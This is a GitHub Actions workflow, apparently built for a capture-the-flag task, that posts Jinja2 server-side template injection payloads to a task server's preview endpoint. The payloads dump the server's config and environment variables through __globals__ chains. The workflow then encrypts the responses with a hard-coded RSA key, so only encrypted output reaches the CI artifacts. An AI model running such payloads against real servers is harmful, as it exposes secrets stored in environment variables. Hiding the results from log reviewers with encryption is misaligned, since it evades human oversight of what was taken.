name: cyberkomi-gov-private-flag-check

on:
  push:
    branches: [ctf-cyberkomi-probe-20260808]
    paths: ['.github/workflows/cyberkomi-gov-flag.yml']
  workflow_dispatch:

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Probe GOV relay SSTI privately
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p out handoff
          BASE='https://task-gov-relay-a90ea5f1999a03b4.caplag-task.ru'
          python3 - <<'PY'
          import json,pathlib,subprocess
          base='https://task-gov-relay-a90ea5f1999a03b4.caplag-task.ru'
          payloads={
            'arith':'{{7*7}}',
            'config':'{{config}}',
            'cycler_env':'{{cycler.__init__.__globals__.os.environ}}',
            'joiner_env':'{{joiner.__init__.__globals__.os.environ}}',
            'namespace_env':'{{namespace.__init__.__globals__.os.environ}}',
            'lipsum_env':'{{lipsum.__globals__["os"].environ}}',
            'cycler_globals':'{{cycler.__init__.__globals__}}',
          }
          for name,tpl in payloads.items():
              req=pathlib.Path(f'/tmp/{name}.json'); req.write_text(json.dumps({'template':tpl}))
              cp=subprocess.run(['curl','-sS','--connect-timeout','8','--max-time','25','-H','Content-Type: application/json','--data-binary',f'@{req}','-D',f'out/{name}.headers','-o',f'out/{name}.body','-w','%{http_code}',base+'/api/preview'],capture_output=True,text=True)
              pathlib.Path(f'out/{name}.status').write_text(cp.stdout)
          PY
          cat > handoff/output_public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAz5AYuQkFbMs5/eUEJA0m
          CsSOaVZF1JE76TRn8js2iN/LLAFu2BIKvbKQY+PQDxyJQqr71keg4cQiMWO5ZCbw
          FmTjq808affSZGx+P49GqYR513e6GDpCHho8cc9TYeOfgeW29tlTb/Qd9lhu6SrI
          ZruTi0jSGuWQXqo24HnWkc9fEA1jRaUPITIZGyemcvH4Qri0WBpN9RO1iWDuuDru
          8nafRMpzEEax/RYuNoJBlrsjjOBBH1kgaf6kPix+ntNBLy59X0D3q3YBTX6b0l5G
          glYE4Y4Gh721x9VT59sdyugL+MkjtOLAHisbDDa3YTjFnmVTBTQ87uJJwMKhlE0f
          e9l8gTS1ZsRixTL9WLV2xD9zy8LpJv95DQ1wTOgRDQr2YFqndrcZjUV8C3V45uxz
          lpnwwR4L19d2ntfGfDpTnvtZBAu7JOWiTwfM09o9i5OIGhXqu3Tq5MEAwMmKiYnz
          jZ/R5nq2EmPQurostLLPctCT570QjSW95e40ZyvI9idpAgMBAAE=
          -----END PUBLIC KEY-----
          PEM
          tar -C out -czf handoff/results.tar.gz .
          openssl rand 32 > handoff/key; openssl rand 16 > handoff/iv
          openssl enc -aes-256-ctr -K "$(xxd -p -c256 handoff/key)" -iv "$(xxd -p -c256 handoff/iv)" -in handoff/results.tar.gz -out handoff/results.enc
          cat handoff/key handoff/iv > handoff/keyblob
          openssl pkeyutl -encrypt -pubin -inkey handoff/output_public.pem -in handoff/keyblob -out handoff/keyblob.enc -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
          rm -rf out handoff/key handoff/iv handoff/keyblob handoff/results.tar.gz handoff/output_public.pem
          echo 'GOV probe completed; encrypted output only.'
      - name: Upload encrypted result
        uses: actions/upload-artifact@v4
        with:
          name: cyberkomi-gov-flag-result
          path: |
            handoff/results.enc
            handoff/keyblob.enc
          retention-days: 1
